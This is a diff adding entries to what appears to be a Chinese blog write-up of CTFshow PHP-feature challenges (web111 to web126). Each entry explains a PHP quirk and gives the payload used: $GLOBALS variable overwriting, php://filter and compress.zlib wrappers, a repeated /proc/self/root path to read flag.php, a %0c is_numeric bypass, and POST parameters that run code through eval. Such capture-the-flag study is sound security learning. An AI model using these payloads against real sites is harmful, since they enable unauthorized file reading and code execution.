@@ -135,6 +135,43 @@ web91
 <p>php内置类 利用 FilesystemIterator 获取指定目录下的所有文件</p>
 <p>getcwd()函数 获取当前工作目录 返回当前工作目录</p>
 <p>回显了fl36dga.txt，直接访问即可。</p>
+<h3 id="web111"><a href="#web111" class="headerlink" title="web111"></a>web111</h3><p><img src="/source/images/ctfshow-php%E7%89%B9%E6%80%A7/27.png"></p>
+<p>看到getflag函数中有两个$$，考的是变量覆盖。</p>
+<p><code>eval(&quot;$$v1 = &amp;$$v2;&quot;); </code>意思是：以v1变量的值为新的变量名，和以v2变量的值为新的变量名，这两个新的变量指向同一个地址，改变一个的值另外一个也跟着改变。如下示例：</p>
+<p>假设调用时 <code>$a = &quot;x&quot;; $b = &quot;y&quot;; $y = 123; getFlag($a, $b);</code>：</p>
+<p>eval(“$$a &#x3D; &amp;$$b;”); 的实际执行是 <code>eval(&quot;$x = &amp;$y;&quot;);即让 </code>$x<code>变量引用</code>$y&#96;。</p>
+<p>调用后，<code>$x</code> 和 <code>$y</code> 变成了相同的引用，即 <code>$x</code> 和 <code>$y</code> 都等于 <code>123</code>，并且任何对 <code>$x</code> 或 <code>$y</code> 的修改会相互影响。</p>
+<p>最终，<code>var_dump($x);</code> 会输出 <code>int(123)</code>。</p>
+<p>这题限制v1要有ctfshow字符串，因此v2必须是我们要传入的值，但是函数内部不能调用外部变量，v2不能直接传flag。但是可以用GLOBALS全局数组。他会调用全局变量。</p>
+<p>payload:?v1&#x3D;ctfshow&amp;v2&#x3D;GLOBALS</p>
+<h3 id="web112"><a href="#web112" class="headerlink" title="web112"></a>web112</h3><p><img src="/source/images/ctfshow-php%E7%89%B9%E6%80%A7/28.png"></p>
+<p>不能是常规文件名，可以用伪协议绕过，但是过滤了一些过滤器，没事网上一搜一大堆。</p>
+<p>payload:?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.quoted-printable-encode&#x2F;resource&#x3D;flag.php这个过滤器就能用</p>
+<h3 id="web113"><a href="#web113" class="headerlink" title="web113"></a>web113</h3><p><img src="/source/images/ctfshow-php%E7%89%B9%E6%80%A7/29.png"></p>
+<p>过滤新增了filter。</p>
+<p>可以用封装协议</p>
+<p>payload1:?file&#x3D;compress.zlib:&#x2F;&#x2F;flag.php</p>
+<p>compress.zlib功能类似于gzopen。将文件压缩或解压缩后输出出来。</p>
+<p>还有一种方法:目录溢出。目录溢出导致is_file认为这不是一个文件。</p>
+<p>payload2:?file&#x3D;&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</p>
+<h3 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h3><p><img src="/source/images/ctfshow-php%E7%89%B9%E6%80%A7/30.png"></p>
+<p>新增了过滤，但是放了filter。我们不用过滤器也能绕</p>
+<p>payload: ?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;flag.php</p>
+<h3 id="web115"><a href="#web115" class="headerlink" title="web115"></a>web115</h3><p><img src="/source/images/ctfshow-php%E7%89%B9%E6%80%A7/31.png"></p>
+<p>payload:?num&#x3D;%0c36</p>
+<p>①函数is_numeric()：检测是不是数字&#x2F;数字字符串。这里的%0c是换页符，%09，%20都可以让is_numeric()函数为true；②trim()函数会去掉num里的%0a %0b %0d %20 %09 所以这里只有%0c可用  ③num&#x3D;&#x3D;36是对的。原因：弱比较状态下会把传入的num进行类似于【intval()】的一个转化【这里不一定是intval转化】最后比较的实际上是‘36’&#x3D;&#x3D;‘36’。肯定相等。④num!&#x3D;&#x3D;36是对的，原因：强比较状态下是比较两个字符串，等于是’%0c36’和‘36’比是不是相等，肯定不相等。</p>
+<h3 id="web123"><a href="#web123" class="headerlink" title="web123"></a>web123</h3><p><img src="/source/images/ctfshow-php%E7%89%B9%E6%80%A7/32.png"></p>
+<p>差点被迷惑了。这题给$c传参进行rce即可。</p>
+<p>payload:POST传参：CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;echo $flag</p>
+<h3 id="web125"><a href="#web125" class="headerlink" title="web125"></a>web125</h3><p><img src="/source/images/ctfshow-php%E7%89%B9%E6%80%A7/33.png"></p>
+<p>新增了过滤问题不大</p>
+<p>GET：?1&#x3D;flag.php</p>
+<p>POST：CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;highlight_file($_GET[1])</p>
+<h3 id="web126"><a href="#web126" class="headerlink" title="web126"></a>web126</h3><p><img src="/source/images/ctfshow-php%E7%89%B9%E6%80%A7/34.png"></p>
+<p>加了长度限制，难度翻倍</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Myon5/article/details/140464776#3%E3%80%81web126">https://blog.csdn.net/Myon5/article/details/140464776#3%E3%80%81web126</a></p>
+<p>这个讲的非常好。</p>
+<p>get：?$fl0g&#x3D;flag_give_me;<br>post：CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;eval($a[0])</p>
 </section>
     
         
